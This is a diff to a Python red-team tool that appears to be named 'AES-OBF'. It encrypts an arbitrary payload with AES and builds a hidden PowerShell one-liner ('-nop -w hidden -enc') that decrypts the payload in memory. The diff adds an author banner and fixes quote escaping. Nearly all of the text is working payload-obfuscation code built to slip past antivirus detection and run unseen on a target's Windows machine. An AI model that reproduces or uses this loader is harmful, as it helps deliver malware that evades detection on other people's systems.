@@ -1,8 +1,26 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import argparse
 import base64
 import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+
+def print_banner():
+    banner = r"""
+   _   ___ ___      ___  ___ ___ 
+  /_\ | __/ __|___ / _ \| _ ) __|
+ / _ \| _|\__ \___| (_) | _ \ _| 
+/_/ \_\___|___/    \___/|___/_|  
+
+╔════════════════════════════════════════════════════════════════════╗
+║ Author  : HackGroch3                                               ║
+║ Role    : Pentester, Red Teamer, Ethical Hacker                    ║
+║ Version : v1.0                                                     ║
+╚════════════════════════════════════════════════════════════════════╝
+"""
+    print(banner)
 
 # Funktion zur Generierung eines zufälligen Schlüssels
 def generate_random_key():
@@ -20,12 +38,12 @@ def encrypt_payload(payload, key, iv):
 def generate_powershell_oneliner(encrypted_payload_b64, key_b64, iv_b64):
     oneliner = f"powershell -nop -w hidden -enc "
     ps_script = f'''
-    $Key = [Convert]::FromBase64String(\"{key_b64}\")
-    $IV = [Convert]::FromBase64String(\"{iv_b64}\")
-    $Encrypted = [Convert]::FromBase64String(\"{encrypted_payload_b64}\")
+    $Key = [Convert]::FromBase64String("{key_b64}")
+    $IV = [Convert]::FromBase64String("{iv_b64}")
+    $Encrypted = [Convert]::FromBase64String("{encrypted_payload_b64}")
     $AES = New-Object System.Security.Cryptography.AesManaged
-    $AES.Mode = \"CBC\"
-    $AES.Padding = \"PKCS7\"
+    $AES.Mode = "CBC"
+    $AES.Padding = "PKCS7"
     $AES.KeySize = 256
     $AES.BlockSize = 128
     $AES.Key = $Key
@@ -42,6 +60,8 @@ def generate_powershell_oneliner(encrypted_payload_b64, key_b64, iv_b64):
     return oneliner + ps_script_b64
 
 def main():
+    print_banner()
+    
     parser = argparse.ArgumentParser(description="AES Payload Encryptor with Random Key Generation and PowerShell Oneliner Generator")
     parser.add_argument("-p", dest="payload", required=True, help="Payload to encrypt")
     args = parser.parse_args()
